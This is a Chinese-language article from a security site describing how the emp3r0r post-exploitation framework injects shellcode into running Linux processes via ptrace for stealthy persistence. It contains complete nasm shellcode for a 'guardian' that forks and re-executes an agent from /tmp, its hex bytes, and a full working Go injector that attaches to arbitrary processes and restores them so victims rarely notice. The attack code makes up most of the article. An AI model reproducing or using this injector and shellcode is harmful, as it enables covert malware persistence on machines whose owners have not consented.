# emp3r0r - Linux下的进程注入和持久化

阅读量 **237542**

|评论 **3**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-01-21 10:00:47

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p0.ssl.qhimg.com/t01e5e906afe15a499c.jpg)

## 背景

本文所介绍的内容是[emp3r0r](https://github.com/jm33-m0/emp3r0r)框架持久化模块的一部分。

Linux有一个独特的东西叫[`procfs`](https://www.commandlinux.com/man-page/man5/procfs.5.html)，把“ _Everything is a file_
”贯彻到了极致。从`/proc/pid/maps`我们能查看进程的内存地址分布，然后在`/proc/pid/mem`我们可以读取或者修改它的内存。

所以理论上我们只需要一个`dd`和`procfs`即可将代码注入一个进程，也确实有人写了[相关的工具](https://github.com/AonCyberLabs/Cexigua)。

但既然Linux提供了一个接口（只有这么一个，不像你们Windows），我们在通常情况下直接调用它就可以了。

## ptrace

对，这唯一的接口就是[`ptrace`](https://linux.die.net/man/2/ptrace)。

这东西是用来操作进程的，大多用于调试器，它提供的功能足够我们完成本文所需的shellcode注入以及进程恢复了。

我们的思路是：

  1. attach到目标进程，将其接管
  2. 把shellcode写到[`RIP`](https://en.wikipedia.org/wiki/RIP_register)指向的位置，在此之前先备份原有的代码
  3. 恢复进程运行
  4. shellcode执行到中断，[`trap`](https://en.wikipedia.org/wiki/Signal_\(IPC)#SIGTRAP)并被我们接管
  5. 我们把原先的代码写回去，寄存器也都恢复
  6. 继续原进程的执行

## 进程的恢复

看了上面的思路，这个似乎并不难。但别忘了，你的shellcode搞乱的不只是这段text和寄存器，它至少还搞乱了原进程的的stack，而且shellcode可能会一直堵塞主线程，这样就永远也不会回到原进程的执行流程了。

而且有的shellcode会直接[`execve`](https://man7.org/linux/man-pages/man2/execve.2.html)从而干脆利落地让原进程成为虚无，你除了再`execve`回去基本上别无它法了。

所以，我直接从原进程[`fork`](https://www.man7.org/linux/man-pages/man2/fork.2.html)出一个子进程，在子进程里执行我的shellcode，顺手恢复原进程，对进程的影响几乎可以忽略不计。

## 菜鸡的第一份shellcode

本菜鸡从未写过shellcode，是`msfvenom`的忠实用户。

我寻思着第一份shellcode就不写烂大街的hello world了，直接写个能用的岂不美哉。

于是在duckduckgo和某开源社区大佬们的指导下，我逐渐明白了该怎么写，武器化之后，就有了这篇文章。

###  怎么写

**啥语言**

正常情况下都是用汇编来写，不过C也可以。某大佬推荐的是这样：

![](https://p3.ssl.qhimg.com/t01d6f2b9d9c5c059b7.jpg)

这样写显而易见的好处是，我们不用费心去操作栈了，数据可以由C来安排好。

本文使用纯汇编来做，这种方法以后有机会再尝试了。

**编辑器**

我当然直接用[vim](https://www.vim.org/)了，你们随便找个熟悉的文本编辑器都可以。

这里用的是[nasm](https://nasm.us/)汇编器，使用Intel语法。

**nasm**

写shellcode的话，不用`section .data`是最好的，省得多出来一堆`\0`字节。

大体上一个针对[`x86_64`](https://en.wikipedia.org/wiki/X86-64)的nasm汇编代码长这样：

    
    
    BITS 64
    global _start
    
    section .text
    _start:
        ...your code...
    

`global _start`类似于`main`，是给linker用的。`BITS 64`代表这是64位汇编。

**hex string**

上面写的东西要转成raw bytes才能用。首先你需要将它们汇编：

    
    
    ❯ nasm yourshellcode.asm -o shellcode.bin
    

然后把这个二进制文件转换成hex string：

    
    
    ❯ xxd -i shellcode.bin | grep 0x | tr -d '[:space:]' | tr -d ',' | sed 's/0x/\\x/g'
    \x48\x31\xc0\x48\x31\xff\xb0\x39\x0f\x05\x48\x83\xf8\x00\x7f\x5e\x48\x31\xc0\x48\x31\xff\xb0\x39\x0f\x05\x48\x83\xf8\x00\x74\x2c\x48\x31\xff\x48\x89\xc7\x48\x31\xf6\x48\x31\xd2\x4d\x31\xd2\x48\x31\xc0\xb0\x3d\x0f\x05\x48\x31\xc0\xb0\x23\x6a\x0a\x6a\x14\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x0f\x05\xe2\xc4\x48\x31\xd2\x52\x48\x31\xc0\x48\xbf\x2f\x2f\x74\x6d\x70\x2f\x2f\x65\x57\x54\x5f\x48\x89\xe7\x52\x57\x48\x89\xe6\x6a\x3b\x58\x99\x0f\x05\xcd\x03
    

如果你不需要这种C style的hex string，也可以这样：

    
    
    ❯ rax2 -S < shellcode.bin
    4831c04831ffb0390f054883f8007f5e4831c04831ffb0390f054883f800742c4831ff4889c74831f64831d24d31d24831c0b03d0f054831c0b0236a0a6a144889e74831f64831d20f05e2c44831d2524831c048bf2f2f746d702f2f6557545f4889e752574889e66a3b58990f05cd03
    

其中`rax2`是[`radare2`](https://github.com/radareorg/radare2)的一部分。

###  syscall

**syscall NR**

[什么是syscall](https://en.wikipedia.org/wiki/System_call)。

为啥叫 _NR_ ？[我查到的](https://stackoverflow.com/questions/8306202/what-does-nr-stand-for-in-system-call-number-that-is-usually-used-as-suffix)是 _Numeric
Reference_ ，听起来有点道理。

简单来说就是代表某个Linux API的数字了，你调用这个syscall的时候需要告诉Linux对应的编号。

[这里](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md)有一个全面的Linux
syscall列表供查阅。

需要注意的是不同架构下，syscall是不同的。我们这里只关心x86_64下的syscall，毕竟主流Linux主机几乎全都是这个架构（说到这里我要吐槽一下，为什么至今Linux
shellcode相关教程还在拿x86汇编教学？）。

**调用约定**

调用一个syscall的过程跟你调用别的什么函数没区别，你设置好参数，call一下就完事了，它还会把返回值给你。

那么用户怎么知道往哪放参数，从哪取返回值呢？离开了编译器的帮助，你得搞清楚它究竟是怎么工作的。

![](https://p5.ssl.qhimg.com/t01d788b5cc22d05e03.png)

上图很清楚地展示了你该怎么使用这些syscall。

对于x86_64架构的Linux而言，syscall
NR也就是编号，需要放到RAX寄存器，调用完返回值也在这里面，然后参数依次放到RDI，RSI，RDX，R10…

需要留意，有的参数是指针类型的，你传入的必须是一个地址而不是数值本身。

###  写一个guardian

本示例是[emp3r0r](https://github.com/jm33-m0/emp3r0r)的一部分，之后更新的版本可以在[这里](https://github.com/jm33-m0/emp3r0r/blob/master/shellcode/guardian.asm)找到。

~~看完了上面的介绍，是不是觉得很简单呢？~~ 让我们来写个guardian程序试试吧。

这段shellcode就是前面所提到思路的具体实现。

我在写这段东西的时候，遇到了不少小问题，对于初学者来说可能是会头疼好久的问题，简单列一下：

  * 需要指针参数的，先`push`入栈，再传`RSP`
  * `push`的操作数超过4字节长，需要借助寄存器来push
  * 记得给字符串或者字符串数组加`\0`终止
  * label不能用保留字

以上问题均针对nasm汇编器，如果你没遇到，就不要告诉我了。

还有些东西说一下：

  * 为什么还要`wait`子进程，因为不这样的话子进程退出之后就变成zombie，在进程列表里太显眼了。
  * 为什么`fork`两次，因为我要`execve`，在当前进程干的话，当前进程就无了。
  * 为什么`sleep`，因为太频繁了会把CPU搞飞起。
  * 为什么`int 0x3`，因为这样是告诉父进程请调试我，是shellcode暂停，从而恢复原进程的关键

    
    
        BITS 64
    
        section .text
        global  _start
    
    _start:
        ;;  fork
        xor rax, rax
        xor rdi, rdi
        mov al, 0x39; syscall fork
        syscall
    
        cmp rax, 0x0; check return value
        jg  pause; int3 if in parent
    
    watchdog:
        ;;  fork to exec agent
        xor rax, rax
        xor rdi, rdi
        mov al, 0x39; syscall fork
        syscall
        cmp rax, 0x0; check return value
        je  exec; exec if in child
    
    wait4zombie:
        ;;  wait to clean up zombies
        xor rdi, rdi
        mov rdi, rax
        xor rsi, rsi
        xor rdx, rdx
        xor r10, r10
        xor rax, rax
        mov al, 0x3d
        syscall
    
    sleep:
        ;;   sleep
        xor  rax, rax
        mov  al, 0x23; syscall nanosleep
        push 10; sleep nano sec
        push 20; sec
        mov  rdi, rsp
        xor  rsi, rsi
        xor  rdx, rdx
        syscall
        loop watchdog
    
    exec:
        ;;   char **envp
        xor  rdx, rdx
        push rdx; '\0'
    
        ;;   char *filename
        xor  rax, rax
        mov  rdi, 0x652f2f706d742f2f; path to the executable
        push rdi; save to stack
        push rsp
        pop  rdi
        mov  rdi, rsp; you can delete this as it does nothing
    
        ;;   char **argv
        push rdx; '\0'
        push rdi
        mov  rsi, rsp; argv[0]
    
        push 0x3b; syscall execve
        pop  rax; ready to call
        cdq
        syscall
    
    pause:
        ;;  trap
        int 0x3
    

## 把shellcode武器化

###  shellcode注入

就像开头所提到的，本文涉及的技术是[emp3r0r](https://github.com/jm33-m0/emp3r0r)后渗透框架的一部分。

[emp3r0r](https://github.com/jm33-m0/emp3r0r)会将本文的shellcode自动注入一些常见的进程：

![](https://p1.ssl.qhimg.com/t016faff91462248aab.png)

在不影响原进程的情况下，我们同时在目标主机的业务进程里启动了一大堆守护进程，除非受害者拿gdb去看，一般来说是很难察觉异常的。

如果你有兴致，也完全可以写一个别的shellcode，实现更多好玩的功能。

所以我们怎么注入？按照前面ptrace的方法，具体实现如下（之后的更新在[这里](https://github.com/jm33-m0/emp3r0r/blob/master/core/internal/agent/injector.go)查看）：

    
    
    // Injector inject shellcode to arbitrary running process
    // target process will be restored after shellcode has done its job
    func Injector(shellcode *string, pid int) error {
        // format
        *shellcode = strings.Replace(*shellcode, ",", "", -1)
        *shellcode = strings.Replace(*shellcode, "0x", "", -1)
        *shellcode = strings.Replace(*shellcode, "\\x", "", -1)
    
        // decode hex shellcode string
        sc, err := hex.DecodeString(*shellcode)
        if err != nil {
            return fmt.Errorf("Decode shellcode: %v", err)
        }
    
        // inject to an existing process or start a new one
        // check /proc/sys/kernel/yama/ptrace_scope if you cant inject to existing processes
        if pid == 0 {
            // start a child process to inject shellcode into
            sec := strconv.Itoa(RandInt(10, 30))
            child := exec.Command("sleep", sec)
            child.SysProcAttr = &syscall.SysProcAttr{Ptrace: true}
            err = child.Start()
            if err != nil {
                return fmt.Errorf("Start `sleep %s`: %v", sec, err)
            }
            pid = child.Process.Pid
    
            // attach
            err = child.Wait() // TRAP the child
            if err != nil {
                log.Printf("child process wait: %v", err)
            }
            log.Printf("Injector (%d): attached to child process (%d)", os.Getpid(), pid)
        } else {
            // attach to an existing process
            proc, err := os.FindProcess(pid)
            if err != nil {
                return fmt.Errorf("%d does not exist: %v", pid, err)
            }
            pid = proc.Pid
    
            // https://github.com/golang/go/issues/43685
            runtime.LockOSThread()
            defer runtime.UnlockOSThread()
            err = syscall.PtraceAttach(pid)
            if err != nil {
                return fmt.Errorf("ptrace attach: %v", err)
            }
            _, err = proc.Wait()
            if err != nil {
                return fmt.Errorf("Wait %d: %v", pid, err)
            }
            log.Printf("Injector (%d): attached to %d", os.Getpid(), pid)
        }
    
        // read RIP
        origRegs := &syscall.PtraceRegs{}
        err = syscall.PtraceGetRegs(pid, origRegs)
        if err != nil {
            return fmt.Errorf("my pid is %d, reading regs from %d: %v", os.Getpid(), pid, err)
        }
        origRip := origRegs.Rip
        log.Printf("Injector: got RIP (0x%x) of %d", origRip, pid)
    
        // save current code for restoring later
        origCode := make([]byte, len(sc))
        n, err := syscall.PtracePeekText(pid, uintptr(origRip), origCode)
        if err != nil {
            return fmt.Errorf("PEEK: 0x%x", origRip)
        }
        log.Printf("Peeked %d bytes of original code: %x at RIP (0x%x)", n, origCode, origRip)
    
        // write shellcode to .text section, where RIP is pointing at
        data := sc
        n, err = syscall.PtracePokeText(pid, uintptr(origRip), data)
        if err != nil {
            return fmt.Errorf("POKE_TEXT at 0x%x %d: %v", uintptr(origRip), pid, err)
        }
        log.Printf("Injected %d bytes at RIP (0x%x)", n, origRip)
    
        // peek: see if shellcode has got injected
        peekWord := make([]byte, len(data))
        n, err = syscall.PtracePeekText(pid, uintptr(origRip), peekWord)
        if err != nil {
            return fmt.Errorf("PEEK: 0x%x", origRip)
        }
        log.Printf("Peeked %d bytes of shellcode: %x at RIP (0x%x)", n, peekWord, origRip)
    
        // continue and wait
        err = syscall.PtraceCont(pid, 0)
        if err != nil {
            return fmt.Errorf("Continue: %v", err)
        }
        var ws syscall.WaitStatus
        _, err = syscall.Wait4(pid, &ws, 0, nil)
        if err != nil {
            return fmt.Errorf("continue: wait4: %v", err)
        }
    
        // what happened to our child?
        switch {
        case ws.Continued():
            return nil
        case ws.CoreDump():
            err = syscall.PtraceGetRegs(pid, origRegs)
            if err != nil {
                return fmt.Errorf("read regs from %d: %v", pid, err)
            }
            return fmt.Errorf("continue: core dumped: RIP at 0x%x", origRegs.Rip)
        case ws.Exited():
            return nil
        case ws.Signaled():
            err = syscall.PtraceGetRegs(pid, origRegs)
            if err != nil {
                return fmt.Errorf("read regs from %d: %v", pid, err)
            }
            return fmt.Errorf("continue: signaled (%s): RIP at 0x%x", ws.Signal(), origRegs.Rip)
        case ws.Stopped():
            stoppedRegs := &syscall.PtraceRegs{}
            err = syscall.PtraceGetRegs(pid, stoppedRegs)
            if err != nil {
                return fmt.Errorf("read regs from %d: %v", pid, err)
            }
            log.Printf("Continue: stopped (%s): RIP at 0x%x", ws.StopSignal().String(), stoppedRegs.Rip)
    
            // restore registers
            err = syscall.PtraceSetRegs(pid, origRegs)
            if err != nil {
                return fmt.Errorf("Restoring process: set regs: %v", err)
            }
    
            // breakpoint hit, restore the process
            n, err = syscall.PtracePokeText(pid, uintptr(origRip), origCode)
            if err != nil {
                return fmt.Errorf("POKE_TEXT at 0x%x %d: %v", uintptr(origRip), pid, err)
            }
            log.Printf("Restored %d bytes at origRip (0x%x)", n, origRip)
    
            // let it run
            err = syscall.PtraceDetach(pid)
            if err != nil {
                return fmt.Errorf("Continue detach: %v", err)
            }
            log.Printf("%d will continue to run", pid)
    
            return nil
        default:
            err = syscall.PtraceGetRegs(pid, origRegs)
            if err != nil {
                return fmt.Errorf("read regs from %d: %v", pid, err)
            }
            log.Printf("continue: RIP at 0x%x", origRegs.Rip)
        }
    
        return nil
    }
    

这可能是为数不多的纯go实现的`ptrace`进程注入工具之一。

主要坑点有：

  * Go的syscall wrapper基本上是从来没有文档的
  * `ptrace`的tracer必须来自同一线程，这是Linux（或者说整个unix）设计的问题
  * 因为Go底层设计的原因，每次调用syscall wrapper，都是一个新线程，所以我研究了半天，靠`runtime.LockOSThread()`解决了[这个问题](https://github.com/jm33-m0/emp3r0r/issues/13)

然后具体原理就很简单了，鉴于Go的syscall
wrapper实际上把`PTRACE_PEEKTEXT`和`PTRACE_POKETEXT`限制的每次只能操作一个word给包装成可操作任意长度数据，这个实现甚至比C原生实现还要简单。

关键点在于备份和恢复。记得我的shellcode写了`int 0x3`吧？这里就是`wait`到`int
0x3`导致的`trap`的状态，进行介入，并恢复原进程。

###  在持久化方面的应用

我目前把这个技术用在持久化方面。虽说不是真正意义上的持久化，但很多机器是万年不重启的，注入到一个几乎不会重启的进程里面，既不会被轻易发现，又很难被干掉。

以下是注入到一个[简单demo程序](https://github.com/jm33-m0/emp3r0r/blob/master/shellcode/sleep.c)的示例：

    
    
    /*
     * This program is used to check shellcode injection
     * */
    
    #include <stdio.h>
    #include <time.h>
    #include <unistd.h>
    
    int main(int argc, char* argv[])
    {
        time_t rawtime;
        struct tm* timeinfo;
    
        while (1) {
            sleep(1);
            time(&rawtime);
            timeinfo = localtime(&rawtime);
            printf("%s: sleeping\n", asctime(timeinfo));
        }
        return 0;
    }
    

shellcode成功注入，原进程继续运行，只是多了个守护[emp3r0r](https://github.com/jm33-m0/emp3r0r)的任务。

![](https://p1.ssl.qhimg.com/t01d797db6316a5eed2.png)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **jm33_ng** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/229096](/post/id/229096)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [linux](/tag/linux)
  * [shellcode](/tag/shellcode)
  * [ptrace](/tag/ptrace)
  * [emp3r0r](/tag/emp3r0r)

 **+1** __11赞

 __收藏

![](https://p1.ssl.qhimg.com/t013c05df2a95968998.png) jm33_ng

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

